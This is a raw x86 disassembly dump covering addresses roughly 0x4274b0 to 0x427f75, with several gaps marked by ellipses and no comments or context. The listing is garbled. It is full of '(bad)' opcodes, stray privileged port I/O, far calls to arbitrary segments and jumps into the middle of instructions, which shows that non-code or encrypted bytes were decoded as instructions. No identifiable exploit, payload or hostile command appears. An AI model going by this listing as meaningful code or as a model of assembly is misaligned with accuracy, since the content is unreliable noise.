  4274b0:	lods   eax,DWORD PTR ds:[esi]
  4274b1:	setbe  BYTE PTR gs:[ebp-0x12]
  4274b6:	sbb    eax,0xdb20ffb8
  4274bb:	and    bh,dl
  4274bd:	or     DWORD PTR [ebx-0x6d],esi
  4274c0:	int3   
  4274c1:	std    
  4274c2:	(bad)  
  4274c3:	bnd jae 0x427537
  4274c6:	enter  0xe177,0x4e
  4274ca:	dec    ebx
  4274cb:	jp     0x42752a
  4274cd:	outs   dx,BYTE PTR ds:[esi]
  4274ce:	cmp    al,0x22
  4274d0:	rol    BYTE PTR [eax],1
  4274d2:	or     eax,0x7227fdd7
  4274d7:	and    edi,DWORD PTR [eax]
  4274d9:	sub    al,0x7e
  4274db:	fwait
  4274dc:	and    esi,DWORD PTR [esi]
  4274de:	dec    ebp
  4274df:	mov    ebx,DWORD PTR [ebx-0x59]
  4274e2:	shl    ebx,cl
  4274e4:	(bad)  
  4274e5:	and    eax,0x4bdcb80a
  4274ea:	xchg   ebp,eax
  4274eb:	cwde   
  4274ec:	and    esp,edi
  4274ee:	test   al,0x7c
  4274f0:	bsr    esi,DWORD PTR [eax+0x63]
  4274f4:	mov    ecx,0x9ea4db95
  4274f9:	adc    eax,0x7a209eee
  4274fe:	shl    BYTE PTR [esi+edi*8-0x3e],1
  427502:	xchg   ebp,eax
  427503:	mov    eax,0x948382ed
  427508:	sub    al,0xec
  42750a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42750b:	add    ch,BYTE PTR [esi+eiz*4-0x5607102e]
  427512:	sub    al,BYTE PTR [esi+eax*4+0x192ecd68]
  427519:	fwait
  42751a:	out    dx,al
  42751b:	mov    edi,0x134a8abf
  427520:	push   esp
  427521:	loope  0x4274fa
  427523:	inc    edx
  427524:	stos   BYTE PTR es:[edi],al
  427525:	retf   
  427526:	push   ds
  427527:	sub    eax,0x8988547e
  42752c:	add    edi,esp
  42752e:	fstp   DWORD PTR [ebx-0x6]
  427531:	mov    ch,0xc9
  427533:	cdq    
  427534:	and    dh,BYTE PTR [ecx]
  427536:	push   cs
  427537:	mov    ebx,0x2df9fb77
  42753c:	out    0x6d,eax
  42753e:	inc    esi
  42753f:	xchg   esp,eax
  427540:	mov    es,WORD PTR [esi-0x64]
  427543:	mov    bh,0x53
  427545:	jl     0x427549
  427547:	push   edi
  427548:	jecxz  0x42755d
  42754a:	cmovs  edi,DWORD PTR ds:0x9a291224
  427551:	sbb    DWORD PTR [esp+ebp*1-0x2a506245],edi
  427558:	ss stc 
  42755a:	jle    0x42752c
  42755c:	cdq    
  42755d:	mov    eax,0x4a5d773d
  427562:	jns    0x4275df
  427564:	and    WORD PTR [edx+edi*4-0x30],bp
  427569:	xchg   ebx,eax
  42756a:	mov    ebp,0xfccf05
	...
  4275d3:	add    BYTE PTR [eax],al
  4275d5:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	dec    eax
  4275e3:	mov    bl,0xd5
  4275e5:	sbb    esp,DWORD PTR [edi-0x5a]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	dec    esp
  4275ef:	push   edi
  4275f0:	cmp    eax,0xf3cb017a
  4275f5:	xor    DWORD PTR [edx],esi
  4275f7:	inc    esp
  4275f8:	(bad)  
  4275f9:	outs   dx,DWORD PTR ds:[esi]
  4275fa:	mov    esi,0x8ec140c8
  4275ff:	retf   
  427600:	add    eax,0x3d023fb3
  427605:	imul   edi,DWORD PTR [edi+edi*2],0xb2fd57f
  42760c:	mov    cl,0xe0
  42760e:	mov    cs,WORD PTR [esi+0x4d58937]
  427614:	or     al,ch
  427616:	imul   esp,DWORD PTR [esi],0x31
  427619:	push   ds
  42761a:	or     ch,BYTE PTR [ebx]
  42761c:	jno    0x4275ce
  42761e:	sub    dl,BYTE PTR [edi-0x4f]
  427621:	repnz or edx,ecx
  427624:	sbb    al,0x91
  427626:	daa    
  427627:	out    0xe7,eax
  427629:	cs retf 0xcda5
  42762d:	or     dl,BYTE PTR [edi]
  42762f:	loope  0x42765d
  427631:	or     eax,0x7c6ef608
  427636:	or     ecx,DWORD PTR [eax+0xf]
  427639:	add    al,0x5d
  42763b:	test   al,0x7f
  42763d:	mov    dh,0x8f
  42763f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427640:	sub    esi,DWORD PTR [ebp+0x17]
  427643:	test   DWORD PTR [ebp-0x22],eax
  427646:	xchg   BYTE PTR [ecx],al
  427648:	test   BYTE PTR [ecx],cl
  42764a:	jge    0x427633
  42764c:	into   
  42764d:	mov    ds:0x3a074cd8,al
  427652:	es xchg esi,eax
  427654:	dec    ebx
  427655:	mov    ecx,0x628e767
  42765a:	dec    ebp
  42765b:	and    bh,BYTE PTR [edx]
  42765d:	sbb    al,0x88
  42765f:	fdiv   st,st(0)
  427661:	ror    BYTE PTR [ecx+0x1bf360a8],1
  427667:	cmp    eax,0x3d9843
  42766c:	outs   dx,DWORD PTR ds:[esi]
  42766d:	aam    0x26
  42766f:	int    0x4a
  427671:	add    eax,0xe30b8cc7
  427676:	or     al,0xfa
  427678:	push   esi
  427679:	mov    eax,0xe2beb801
  42767e:	push   ds
  42767f:	mov    edx,0xca789ef
  427684:	mov    edi,0xc2a7abca
  427689:	mov    dh,0x93
  42768b:	jmp    0x427683
  42768d:	clc    
  42768e:	or     eax,0xdc0b44e2
  427693:	repnz mov al,0x94
  427696:	rcr    BYTE PTR [edi],0xb0
  427699:	in     al,dx
  42769a:	test   eax,0xc2e93a1e
  42769f:	cli    
  4276a0:	pop    ecx
  4276a1:	jo     0x4276bb
  4276a3:	cmc    
  4276a4:	nop
  4276a5:	push   esi
  4276a6:	gs pop ds
  4276a8:	call   0x94c8:0xdf4bf76c
  4276af:	pusha  
  4276b0:	add    DWORD PTR ds:[ebx+0x2449b9d9],esp
  4276b7:	ret    0xd82
  4276ba:	aas    
  4276bb:	adc    ecx,0x4ad0d124
  4276c1:	jmp    0x4276e2
  4276c3:	cld    
  4276c4:	pop    ebx
  4276c5:	in     eax,dx
  4276c6:	dec    ecx
  4276c7:	pop    ecx
  4276c8:	jmp    0x42769d
  4276ca:	push   cs
  4276cb:	sub    dl,BYTE PTR [ecx-0x1a8a48f4]
  4276d1:	pop    bx
  4276d3:	fwait
  4276d4:	cmc    
  4276d5:	xor    al,0xee
  4276d7:	and    al,0xea
  4276d9:	mov    ss,ecx
  4276db:	xchg   ebx,eax
  4276dc:	xor    DWORD PTR [ecx-0x6890c2c4],esp
  4276e2:	jg     0x42775c
  4276e4:	pop    ss
  4276e5:	mov    al,0x44
  4276e7:	mov    ebp,0xa76fc57e
  4276ec:	ins    DWORD PTR es:[edi],dx
  4276ed:	adc    BYTE PTR [eax],al
	...
  427753:	add    BYTE PTR [eax],al
  427755:	add    BYTE PTR [ecx],al
  427757:	push   esi
  427758:	nop
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fnstenv [esi-0x42]
  427764:	push   ss
  427765:	mov    al,ds:0x1a767
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	adc    DWORD PTR [ecx+0x7110efe0],edx
  427774:	or     ch,dh
  427776:	call   0xbe74:0x37af60d6
  42777d:	add    BYTE PTR [esi+0x26],ch
  427780:	cli    
  427781:	shl    BYTE PTR [esi+ebp*4+0x352e403a],1
  427788:	dec    ebp
  427789:	xor    DWORD PTR [esi],eax
  42778b:	add    al,0xaa
  42778d:	cdq    
  42778e:	mov    dl,0xc4
  427790:	jmp    0x427810
  427792:	sbb    dl,ah
  427794:	xor    eax,DWORD PTR [eax-0x6c]
  427797:	(bad)  
  427798:	(bad)
  42779b:	test   BYTE PTR [ebp+0xa],0x3c
  42779f:	push   es
  4277a0:	add    al,0x4e
  4277a2:	(bad)  
  4277a3:	int3   
  4277a4:	jbe    0x4277b8
  4277a6:	out    dx,eax
  4277a7:	pop    ds
  4277a8:	lock fdivr QWORD PTR [edx+0x7c]
  4277ac:	mov    ds:0x67160f4e,al
  4277b1:	stc    
  4277b2:	jbe    0x4277ba
  4277b4:	and    al,0xd6
  4277b6:	(bad)  
  4277b7:	mov    esp,0x72224f00
  4277bc:	(bad)  
  4277bd:	pop    eax
  4277be:	mov    bh,0x31
  4277c0:	sbb    eax,0x73c67738
  4277c5:	jns    0x42776c
  4277c7:	sbb    eax,DWORD PTR [edi]
  4277c9:	repnz mov ?,WORD PTR [eax+0x7e]
  4277cd:	sbb    esi,eax
  4277cf:	fwait
  4277d0:	int3   
  4277d1:	jne    0x4277d2
  4277d3:	jp     0x42776c
  4277d5:	out    dx,al
  4277d6:	adc    al,0x6d
  4277d8:	xor    al,0xe0
  4277da:	xchg   edx,eax
  4277db:	aaa    
  4277dc:	sar    DWORD PTR [edi+0x5353207c],1
  4277e2:	inc    eax
  4277e3:	das    
  4277e4:	stos   BYTE PTR es:[edi],al
  4277e5:	retf   0x3a96
  4277e8:	in     eax,0x9a
  4277ea:	push   edi
  4277eb:	mov    esi,0xca5e2a53
  4277f0:	(bad)  
  4277f2:	or     DWORD PTR [edi+0x5414cdf4],0xffffffae
  4277f9:	sbb    edx,0xe7165093
  4277ff:	dec    ebp
  427800:	test   edi,ecx
  427802:	sub    eax,0xfafe8268
  427807:	js     0x4277b2
  427809:	or     cl,BYTE PTR [esi-0x60]
  42780c:	xor    BYTE PTR [edx+0x88b82ac],dh
  427812:	pop    edi
  427813:	addr16 pusha 
  427815:	push   ds
  427816:	fist   DWORD PTR [ebp+esi*4+0x275c06da]
  42781d:	ret    
  42781e:	mov    al,ds:0x4bbbca41
  427823:	lahf   
  427824:	jp     0x427863
  427826:	fdivr  QWORD PTR [esi]
  427828:	sbb    eax,0x5f1d1aea
  42782d:	or     eax,0x24ad9e7
  427832:	pop    ecx
  427833:	loopne 0x427832
  427835:	cmp    esp,eax
  427837:	loop   0x427801
  427839:	xchg   BYTE PTR [esi],dh
  42783b:	inc    edx
  42783c:	cmc    
  42783d:	and    DWORD PTR [edx+0x4b],ebp
  427840:	out    0x3a,eax
  427842:	lea    ebx,[ecx-0x388d57c0]
  427848:	enter  0x6e2c,0x81
  42784c:	cmp    DWORD PTR [ebx-0xdf486ca],esp
  427852:	push   es
  427853:	rol    BYTE PTR [edx+0x15035477],0xa4
  42785a:	fadd   st(0),st
  42785c:	sahf   
  42785d:	fldcw  WORD PTR [ebp-0x346c6179]
  427863:	xchg   esi,eax
  427864:	jns    0x4277ff
  427866:	bswap  ebp
  427868:	push   DWORD PTR [edi]
  42786a:	lods   al,BYTE PTR ds:[esi]
  42786b:	rcl    DWORD PTR [esi+ecx*8+0x0],1
	...
  4278d6:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4278dc:	pop    esi
  4278dd:	fbstp  TBYTE PTR [eax+0x65]
  4278e0:	fldl2e 
  4278e2:	push   esi
  4278e3:	push   eax
  4278e4:	retf   
  4278e5:	stc    
  4278e6:	addr16 test al,0x1
  4278e9:	add    BYTE PTR [eax],al
  4278eb:	add    DWORD PTR [eax],eax
  4278ed:	add    BYTE PTR [esi],dl
  4278ef:	xchg   DWORD PTR [ebx+0x12d0d262],esi
  4278f5:	repnz pusha 
  4278f7:	adc    DWORD PTR [edi+ecx*1],edi
  4278fa:	in     eax,dx
  4278fb:	jl     0x42789b
  4278fd:	(bad)  
  4278fe:	frstor [edi-0x1b2bdef1]
  427904:	jae    0x427891
  427906:	fisttp DWORD PTR [eax]
  427908:	adc    eax,0xe299ab41
  42790d:	pop    esp
  42790e:	sti    
  42790f:	mov    bl,0xd
  427911:	jecxz  0x427957
  427913:	xchg   ebp,eax
  427914:	mov    ebx,0xcbacde99
  427919:	shl    ecx,0xde
  42791c:	sub    ebx,esp
  42791e:	inc    esi
  42791f:	inc    esi
  427920:	and    BYTE PTR [eax+0x5e07a33c],ch
  427926:	inc    ecx
  427927:	je     0x4278b1
  427929:	fst    QWORD PTR [edx+0x33]
  42792c:	dec    ebp
  42792d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42792e:	sbb    al,0xbf
  427930:	mov    bl,0x6d
  427932:	push   es
  427933:	mov    esp,0xf8a390e5
  427938:	sub    edi,DWORD PTR [ebp-0x69a145e7]
  42793e:	xchg   ebx,eax
  42793f:	jg     0x42795f
  427941:	gs dec eax
  427943:	clc    
  427944:	add    ecx,DWORD PTR [esi+0x33ee3de6]
  42794a:	aas    
  42794b:	jo     0x4279ac
  42794d:	mov    esp,0x79fa4afb
  427952:	pushf  
  427953:	aam    0xe5
  427955:	push   ecx
  427956:	xor    DWORD PTR ds:0x6b0f6ade,ecx
  42795c:	push   edx
  42795d:	mov    ebp,0xbb85283e
  427962:	sub    al,ch
  427964:	fist   WORD PTR [eax]
  427966:	mov    ch,0x8b
  427968:	icebp  
  427969:	imul   ecx,DWORD PTR [eax-0xd3ca6b6],0x65e94d5c
  427973:	dec    ecx
  427974:	jnp    0x427993
  427976:	pop    ss
  427977:	test   eax,0xdc071cf
  42797c:	sar    DWORD PTR ds:0x3a8d4410,0xae
  427983:	lock in eax,0xb4
  427986:	dec    ecx
  427987:	xchg   edi,eax
  427988:	jb     0x4279e3
  42798a:	sub    eax,0x50afcd0a
  42798f:	pop    edi
  427990:	mov    eax,ds:0x5af79e3e
  427995:	dec    DWORD PTR [ebp-0x53227ae4]
  42799b:	mov    ds:0xaee39d58,eax
  4279a0:	lods   eax,DWORD PTR ds:[esi]
  4279a1:	out    0x35,eax
  4279a3:	mov    bh,0x65
  4279a5:	jae    0x4279a8
  4279a7:	add    al,BYTE PTR [esi+0xf]
  4279aa:	pop    eax
  4279ab:	jle    0x4279e6
  4279ad:	stos   DWORD PTR es:[edi],eax
  4279ae:	dec    eax
  4279af:	sbb    dl,BYTE PTR [edi+0x7f]
  4279b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279b3:	jl     0x427a34
  4279b5:	jge    0x4279b6
  4279b7:	or     dl,BYTE PTR [esi-0x70]
  4279ba:	add    al,0x61
  4279bc:	imul   edi,DWORD PTR [ebx+0x420f87df],0xffffffba
  4279c3:	test   BYTE PTR [esi],0x18
  4279c6:	mov    ch,0xf5
  4279c8:	jle    0x427a1e
  4279ca:	sbb    eax,0x79becc0e
  4279cf:	cmp    edi,eax
  4279d1:	fs cmp eax,0xde99683d
  4279d7:	pop    edx
  4279d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279d9:	es repz push ecx
  4279dc:	add    DWORD PTR [edx+edi*1-0x2a],esp
  4279e0:	mov    ebp,0xa4e034a3
  4279e5:	sub    ch,dl
  4279e7:	xchg   dh,bh
  4279e9:	pop    ecx
  4279ea:	mov    cl,BYTE PTR [eax+0x40]
  4279ed:	mov    dl,0x0
	...
  427a53:	add    BYTE PTR [eax],al
  427a55:	add    BYTE PTR [edx-0x5c0023],bl
  427a5b:	mov    ds:0x7542fdde,eax
  427a60:	fadd   DWORD PTR [ebx+0x4fe3b1ea]
  427a66:	addr16 test eax,0x1000001
  427a6c:	add    BYTE PTR [eax],al
  427a6e:	jb     0x427ab8
  427a70:	test   eax,0xb95283e5
  427a75:	xor    al,al
  427a77:	nop
  427a78:	cli    
  427a79:	jno    0x427a1c
  427a7b:	mov    esi,0x9c8e3331
  427a80:	ins    BYTE PTR es:[edi],dx
  427a81:	daa    
  427a82:	ret    
  427a83:	push   ecx
  427a84:	add    BYTE PTR [edi+0x13],al
  427a87:	leave  
  427a88:	xchg   BYTE PTR [esi-0x523dbdaf],bl
  427a8e:	out    0xe9,eax
  427a90:	bnd je 0x427aeb
  427a93:	mov    eax,0x61451466
  427a98:	loop   0x427a50
  427a9a:	daa    
  427a9b:	inc    DWORD PTR [edx-0x7b]
  427a9e:	or     eax,0x2c0ace33
  427aa3:	push   esi
  427aa4:	hlt    
  427aa5:	dec    edx
  427aa6:	stc    
  427aa7:	inc    ecx
  427aa8:	or     BYTE PTR [edx],cl
  427aaa:	sub    eax,0x88bf88ee
  427aaf:	ss mov esi,ecx
  427ab2:	mov    ch,BYTE PTR [edi]
  427ab4:	aam    0x2e
  427ab6:	and    al,0x77
  427ab8:	shl    edx,cl
  427aba:	(bad)  
  427abb:	jmp    0x6611:0x3dd6443a
  427ac2:	push   eax
  427ac3:	sbb    ebp,DWORD PTR [ebx]
  427ac5:	mov    eax,ds:0x9b7f5e7f
  427aca:	or     DWORD PTR [ebx-0x1de65247],edx
  427ad0:	dec    ebp
  427ad1:	mov    esi,0xce9129b4
  427ad6:	cs stos DWORD PTR es:[di],eax
  427ad9:	daa    
  427ada:	push   0xfffffff0
  427adc:	pusha  
  427add:	jl     0x427a60
  427adf:	mov    ds:0x1b2a9823,al
  427ae4:	cs adc eax,edi
  427ae7:	outs   dx,BYTE PTR ds:[esi]
  427ae8:	or     DWORD PTR [ebx+0x293d4f35],ebp
  427aee:	enter  0x46eb,0xa9
  427af2:	mov    al,0xff
  427af4:	aad    0x84
  427af6:	cmp    eax,0xf06a4c2
  427afb:	dec    ebx
  427afc:	cmp    ecx,ebp
  427afe:	jnp    0x427abe
  427b00:	cmp    al,0xda
  427b02:	xor    eax,0xe634ba9
  427b07:	pushf  
  427b08:	aad    0x68
  427b0a:	xchg   ebp,eax
  427b0b:	call   0x8dabb423
  427b10:	fdivrp st(2),st
  427b12:	xor    ah,BYTE PTR [ebp-0x44231f41]
  427b18:	out    dx,eax
  427b19:	in     eax,dx
  427b1a:	adc    BYTE PTR [ebp+0x5dc715d1],dl
  427b20:	aam    0x5b
  427b22:	cmp    eax,0x5d583b4e
  427b27:	stc    
  427b28:	add    DWORD PTR [edx+eiz*1],ebx
  427b2b:	mov    dl,BYTE PTR [ecx+0x7f29a16c]
  427b31:	push   0xffffffa3
  427b33:	fld    QWORD PTR [ecx+0x3a059480]
  427b39:	fwait
  427b3a:	into   
  427b3b:	icebp  
  427b3c:	adc    DWORD PTR [edx-0x27463901],ebp
  427b42:	pop    ss
  427b43:	xchg   ecx,eax
  427b44:	cmp    eax,0xd2e7082c
  427b49:	cld    
  427b4a:	xchg   DWORD PTR [ecx-0xfd7de16],ecx
  427b50:	sub    ah,BYTE PTR [ebx-0x20]
  427b53:	push   ebp
  427b54:	les    ecx,FWORD PTR [ebp-0x7e]
  427b57:	pusha  
  427b58:	loopne 0x427af9
  427b5a:	ss mov bh,0x54
  427b5d:	sub    al,0x9b
  427b5f:	pop    ds
  427b60:	iret   
  427b61:	pop    eax
  427b62:	adc    ebx,edi
  427b64:	add    bh,dl
  427b66:	push   0x6b
  427b68:	mov    es,ebp
  427b6a:	pause  
  427b6c:	inc    edi
  427b6d:	loop   0x427b6f
	...
  427bd3:	add    BYTE PTR [eax],al
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	idiv   BYTE PTR [ebx+0x67f978ce]
  427be7:	stos   BYTE PTR es:[edi],al
  427be8:	add    DWORD PTR [eax],eax
  427bea:	add    BYTE PTR [ecx],al
  427bec:	add    BYTE PTR [eax],al
  427bee:	xor    ecx,DWORD PTR [eax+0x2e4ef29c]
  427bf4:	std    
  427bf5:	push   es
  427bf6:	xchg   edi,eax
  427bf7:	jmp    0x427b9d
  427bf9:	imul   ebp,DWORD PTR [edx+0x7abfdab8],0x16
  427c00:	add    eax,0x84e22fbe
  427c06:	js     0x427c16
  427c08:	icebp  
  427c09:	imul   ebx,DWORD PTR [ecx],0xffffffd8
  427c0c:	jecxz  0x427c2b
  427c0e:	sub    BYTE PTR [ebx+0x2a],bh
  427c11:	adc    dl,BYTE PTR [ebx+ebp*4-0x3b]
  427c15:	sbb    bl,al
  427c17:	shl    BYTE PTR ds:0xc1ab62d3,0xbb
  427c1e:	ror    dh,0xd1
  427c21:	push   edi
  427c22:	outs   dx,DWORD PTR ds:[esi]
  427c23:	in     eax,0x64
  427c25:	stos   DWORD PTR es:[edi],eax
  427c26:	or     dh,BYTE PTR [edi]
  427c28:	leave  
  427c29:	inc    esi
  427c2a:	mov    ch,0x55
  427c2c:	and    al,0xd9
  427c2e:	clc    
  427c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c30:	call   0x471a:0xf91d8132
  427c37:	cli    
  427c38:	xchg   edx,eax
  427c39:	sbb    cl,BYTE PTR [eax-0x5a54f3b9]
  427c3f:	iret   
  427c40:	ret    0x6880
  427c43:	in     eax,0xb2
  427c45:	mov    dl,0xae
  427c47:	in     eax,dx
  427c48:	iret   
  427c49:	dec    ecx
  427c4a:	test   DWORD PTR [ecx],0x525b56cd
  427c50:	push   ds
  427c51:	dec    esi
  427c52:	lahf   
  427c53:	shl    BYTE PTR cs:[esi+ecx*4+0x4421dad7],cl
  427c5b:	cwde   
  427c5c:	xchg   edx,eax
  427c5d:	jns    0x427c5d
  427c5f:	dec    edi
  427c60:	pop    ds
  427c61:	mov    BYTE PTR [ebx+esi*2-0x6f4e63a5],al
  427c68:	xor    al,0xb
  427c6a:	mov    al,ds:0x3b505940
  427c6f:	mov    dl,0x42
  427c71:	push   esi
  427c72:	adc    eax,0x1b24e0d
  427c77:	test   ecx,ebp
  427c79:	call   0x7f09:0xe89e3633
  427c80:	cs jae 0x427cc6
  427c83:	jl     0x427c92
  427c85:	(bad)  
  427c87:	(bad)  
  427c88:	pop    edi
  427c89:	(bad)  
  427c8a:	adc    al,0x69
  427c8c:	mov    esi,ebx
  427c8e:	fidivr WORD PTR [esi+edi*1+0xe0c205]
  427c95:	(bad)  
  427c96:	pop    eax
  427c97:	dec    ecx
  427c98:	cs push esi
  427c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c9b:	jl     0x427c5e
  427c9d:	enter  0xbb6d,0x33
  427ca1:	mov    cl,0xa5
  427ca3:	ret    
  427ca4:	in     al,0x36
  427ca6:	add    bh,BYTE PTR [ebp-0x66b9afa0]
  427cac:	and    bl,BYTE PTR [ebp+edx*4-0x459cf518]
  427cb3:	pushf  
  427cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427cb5:	add    al,0xdb
  427cb7:	imul   esi,DWORD PTR [esi+0x35],0x9a8b2a33
  427cbe:	(bad)  
  427cbf:	loopne 0x427c85
  427cc1:	sub    al,0x9b
  427cc3:	ins    BYTE PTR es:[edi],dx
  427cc4:	dec    esp
  427cc5:	mov    ds:0xa2ffd643,eax
  427cca:	arpl   WORD PTR [ecx],dx
  427ccc:	test   eax,0x6f444abe
  427cd1:	inc    esi
  427cd2:	jp     0x427d1c
  427cd4:	mov    ebp,0x350cc14e
  427cd9:	mov    al,ds:0x33072e80
  427cde:	fst    QWORD PTR [ebx]
  427ce0:	sti    
  427ce1:	lea    esi,[esi-0x11]
  427ce4:	jp     0x427cce
  427ce6:	js     0x427cef
  427ce8:	pop    ds
  427ce9:	xlat   BYTE PTR ds:[ebx]
  427cea:	inc    esp
  427ceb:	cmp    ch,BYTE PTR [edx+0x18]
	...
  427d56:	mov    ds:0xf343b050,eax
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0x84565d44,ebx
  427d64:	sub    DWORD PTR [edi+eiz*2+0x1ab],0xb4000001
  427d6f:	loop   0x427d60
  427d71:	cmp    dh,BYTE PTR [edi-0xf05a817]
  427d77:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  427d79:	dec    eax
  427d7a:	aas    
  427d7b:	nop
  427d7c:	cmp    cl,al
  427d7e:	enter  0xf1c8,0xc
  427d82:	or     bl,BYTE PTR ds:0x208cb684
  427d88:	leave  
  427d89:	xchg   ebx,eax
  427d8a:	loop   0x427dfd
  427d8c:	adc    BYTE PTR ds:0x9506b6e4,dh
  427d92:	js     0x427dc9
  427d94:	call   0x26ee:0x27d740bb
  427d9b:	dec    esi
  427d9c:	int3   
  427d9d:	sbb    BYTE PTR ds:[esp+edi*8],0x46
  427da2:	mov    bp,0x348a
  427da6:	cmp    eax,0x68fcdcca
  427dab:	pushf  
  427dac:	push   ebx
  427dad:	pop    esi
  427dae:	loope  0x427e18
  427db0:	cwde   
  427db1:	cmp    DWORD PTR [esi-0x6f],edx
  427db4:	ss lock mov ebp,0xfe6b9aa8
  427dbb:	loopne 0x427e39
  427dbd:	pop    esi
  427dbe:	fnsave [ecx]
  427dc0:	xor    DWORD PTR [ecx],eax
  427dc2:	scas   eax,DWORD PTR es:[edi]
  427dc3:	mov    edx,0xb2251b05
  427dc8:	mov    ds:0x4df5fdf4,al
  427dcd:	in     eax,0x52
  427dcf:	call   0x3d91e03f
  427dd4:	je     0x427dce
  427dd6:	aaa    
  427dd7:	sub    BYTE PTR [ebx-0x67],bl
  427dda:	shr    DWORD PTR [ebx-0x19c64f5d],0x4a
  427de1:	call   0xb77:0x852fe5df
  427de8:	call   0x2bb8:0x3e407200
  427def:	add    eax,edi
  427df1:	repz pushf 
  427df3:	or     esp,0xd
  427df6:	dec    esp
  427df7:	shr    DWORD PTR [eax+0x3ed128f7],0x51
  427dfe:	lock sbb DWORD PTR [ecx],0x553b5b60
  427e05:	lods   eax,DWORD PTR ds:[esi]
  427e06:	xchg   ah,ah
  427e08:	pop    ecx
  427e09:	jne    0x427dcb
  427e0b:	or     al,0xd9
  427e0d:	adc    al,ch
  427e0f:	iret   
  427e10:	gs inc edx
  427e12:	xchg   esp,eax
  427e13:	jecxz  0x427e6c
  427e15:	rol    edi,0x34
  427e18:	sti    
  427e19:	aaa    
  427e1a:	mov    bl,0x2c
  427e1c:	jne    0x427e95
  427e1e:	fldenv [edi+0x13]
  427e21:	retf   
  427e22:	add    BYTE PTR [ebx+eax*1-0x54],ch
  427e26:	mov    al,ds:0xadfca81
  427e2b:	mov    ebp,DWORD PTR [edi-0x25c66e9e]
  427e31:	aam    0xe9
  427e33:	add    esi,DWORD PTR [eax]
  427e35:	int3   
  427e36:	jg     0x427e58
  427e38:	dec    ecx
  427e39:	pop    eax
  427e3a:	dec    eax
  427e3b:	(bad)  
  427e3c:	enter  0xcbe5,0x4d
  427e40:	push   edx
  427e41:	adc    BYTE PTR [edi-0x15d55150],ch
  427e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e48:	inc    ebx
  427e49:	(bad)  
  427e4b:	pop    ebp
  427e4c:	or     eax,0xe789a74d
  427e51:	jmp    0xde9b:0x7205cfc1
  427e58:	cmp    al,0x2e
  427e5a:	pop    ecx
  427e5b:	cli    
  427e5c:	pop    edi
  427e5d:	add    eax,0xd0f613ab
  427e62:	(bad)  
  427e63:	or     dl,BYTE PTR [esp+eax*2+0x5d]
  427e67:	neg    BYTE PTR [ebx-0x20]
  427e6a:	pusha  
  427e6b:	data16 mov dh,0x7f
	...
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	in     eax,0xbb
  427ee4:	leave  
  427ee5:	aaa    
  427ee6:	lods   al,BYTE PTR ds:[si]
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	add    BYTE PTR [ecx],al
  427eec:	add    BYTE PTR [eax],al
  427eee:	lods   eax,DWORD PTR ds:[esi]
  427eef:	and    DWORD PTR [edx],ecx
  427ef1:	test   ebx,ecx
  427ef3:	sbb    eax,0xbb280e89
  427ef8:	add    BYTE PTR [edi+0x24],bh
  427efb:	mov    esp,0x1e779b86
  427f00:	test   ebp,edi
  427f02:	iret   
  427f03:	pop    ecx
  427f04:	inc    edx
  427f05:	jo     0x427f30
  427f07:	add    bh,bh
  427f09:	inc    esp
  427f0a:	popa   
  427f0b:	jbe    0x427f54
  427f0d:	dec    eax
  427f0e:	dec    ebp
  427f0f:	iret   
  427f10:	xchg   ecx,eax
  427f11:	cli    
  427f12:	iret   
  427f13:	sbb    DWORD PTR [esi-0xa],esi
  427f16:	xchg   edi,eax
  427f17:	inc    edx
  427f18:	dec    edi
  427f19:	mov    BYTE PTR [edi-0x5f876615],ch
  427f1f:	fnstcw WORD PTR ds:[edi]
  427f22:	ss mov bh,0x5a
  427f25:	sar    DWORD PTR [ebx],0xae
  427f28:	xchg   ebx,eax
  427f29:	pop    ds
  427f2a:	fsub   DWORD PTR [ebx+0x42]
  427f2d:	(bad)  
  427f2e:	xchg   ecx,eax
  427f2f:	(bad)
  427f33:	(bad)  
  427f35:	mov    esp,0xee2ab795
  427f3a:	xchg   DWORD PTR [edx-0x78],edx
  427f3d:	lea    edi,[eax-0x50]
  427f40:	imul   ecx,DWORD PTR [ebp-0x34717509],0x8452a74e
  427f4a:	xchg   DWORD PTR [edx+ebx*8+0x44ea1fbb],esi
  427f51:	dec    eax
  427f52:	mov    al,BYTE PTR [edx]
  427f54:	sub    DWORD PTR [ebx+0x32],ecx
  427f57:	sub    al,0xc
  427f59:	mov    ah,0x8b
  427f5b:	inc    edx
  427f5c:	cmc    
  427f5d:	into   
  427f5e:	inc    esp
  427f5f:	cmp    eax,0x1c965bbb
  427f64:	leave  
  427f65:	inc    esi
  427f66:	ficomp WORD PTR [edi-0x646b2393]
  427f6c:	es in  al,dx
  427f6e:	xor    ecx,edx
  427f70:	(bad)  
  427f72:	push   edx
  427f73:	jg     0x427fc2
  427f75:	sub    ebp,DWORD PTR [ecx+eiz*4-0x67870418]
